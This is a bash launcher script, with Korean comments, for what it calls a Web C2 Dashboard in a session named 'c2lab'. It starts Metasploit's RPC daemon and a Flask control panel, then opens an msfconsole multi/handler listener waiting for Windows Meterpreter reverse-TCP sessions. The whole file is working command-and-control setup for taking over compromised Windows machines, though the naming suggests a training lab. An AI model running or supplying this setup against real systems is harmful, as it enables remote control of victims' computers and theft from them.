#!/bin/bash
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SESSION="c2lab"
MSF_PASSWORD="${MSF_PASSWORD:-msfrpc}"
LPORT="${LPORT:-4444}"

# LHOST 자동 감지
LHOST="${LHOST:-$(python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('10.254.254.254', 1))
print(s.getsockname()[0])
s.close()
" 2>/dev/null || hostname -I | awk '{print $1}')}"

R='\033[0;31m'; G='\033[0;32m'; C='\033[0;36m'; Y='\033[1;33m'; N='\033[0m'

echo -e "${C}"
echo "  ╔══════════════════════════════════════╗"
echo "  ║          Web C2 Dashboard            ║"
echo "  ╠══════════════════════════════════════╣"
echo -e "  ║  LHOST  ${Y}$LHOST${C}"
echo -e "  ║  LPORT  ${Y}$LPORT${C}"
echo -e "  ║  DASH   ${Y}http://$LHOST:5000${C}"
echo "  ╚══════════════════════════════════════╝"
echo -e "${N}"

# ── tmux 확인 ─────────────────────────────────────────────────────────────────
if ! command -v tmux &>/dev/null; then
    echo -e "${Y}[*] tmux 설치 중...${N}"
    apt-get install -y tmux -q
fi

# ── 의존성 설치 ───────────────────────────────────────────────────────────────
echo -e "${G}[1/3] Python 의존성 설치...${N}"
pip install -q -r "$SCRIPT_DIR/backend/requirements.txt"

# ── 기존 프로세스 정리 ────────────────────────────────────────────────────────
echo -e "${G}[2/3] 기존 프로세스 정리...${N}"
pkill -f msfrpcd         2>/dev/null || true
pkill -f "python.*app\.py" 2>/dev/null || true
fuser -k -n tcp 55553    2>/dev/null || true
fuser -k -n tcp 5000     2>/dev/null || true
sleep 1

# ── msfrpcd 시작 ──────────────────────────────────────────────────────────────
echo -e "${G}[3/3] msfrpcd 시작 (5초 대기)...${N}"
msfrpcd -P "$MSF_PASSWORD" -n -f -a 127.0.0.1 -p 55553 \
    >/tmp/msfrpcd.log 2>&1 &
sleep 5

# ── tmux 세션 구성 ────────────────────────────────────────────────────────────
tmux kill-session -t "$SESSION" 2>/dev/null || true
tmux new-session -d -s "$SESSION" -x 220 -y 50

# 상단 (65%) — Flask 대시보드
tmux send-keys -t "$SESSION:0.0" \
    "cd '$SCRIPT_DIR/backend' && \
     MSF_PASSWORD='$MSF_PASSWORD' LHOST='$LHOST' LPORT='$LPORT' \
     python app.py" Enter

# 하단 (35%) — msfconsole 리스너
tmux split-window -t "$SESSION:0" -v -p 35
tmux send-keys -t "$SESSION:0.1" \
    "sleep 3 && msfconsole -q -x \
     \"use exploit/multi/handler; \
       set payload windows/meterpreter/reverse_tcp; \
       set LHOST $LHOST; \
       set LPORT $LPORT; \
       exploit;\"" Enter

# 포커스: 상단(Flask)
tmux select-pane -t "$SESSION:0.0"

echo -e "\n${G}[+] 완료${N}"
echo -e "    대시보드 : ${Y}http://$LHOST:5000${N}"
echo -e "    세션 분리 : ${Y}Ctrl+B  D${N}"
echo -e "    패널 이동 : ${Y}Ctrl+B  방향키${N}"
echo -e "    패널 종료 : ${Y}Ctrl+B  X${N}\n"

tmux attach-session -t "$SESSION"
